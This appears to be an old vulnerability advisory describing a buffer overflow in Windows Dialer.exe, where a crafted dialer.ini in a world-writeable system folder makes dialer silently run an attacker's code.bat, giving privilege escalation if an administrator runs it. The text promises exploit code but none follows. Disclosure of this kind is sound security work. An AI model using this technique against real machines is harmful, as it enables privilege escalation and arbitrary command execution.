Dialer.exe has an unchecked buffer in the part of the program that reads dialer entries from %systemroot%\dialer.ini. A specially-formed entry could cause arbitrary code to be run on the machine. By default, the %systemroot% folder is world-writeable. Dialer.ini is Dialer runs in the security context of the user, so an attacker would have to have a higher authority user dial the entry to gain any escalated priveleges.

The following code will create a trojaned dialer.ini file that when read in by dialer will cause it to run a batch file called code.bat - this is hidden from the desktop by calling the equivalent of WinExec("code.bat",0); - and then ExitProcess(0); is called to shutup dialer.exe. Once the dialer.ini has been trojaned the attacker would create a batch file called code.bat and place in there any commands they wished to be run. Needless to say that if a user with admin rights runs dialer any commands placed in this batch file are likely to succeed.
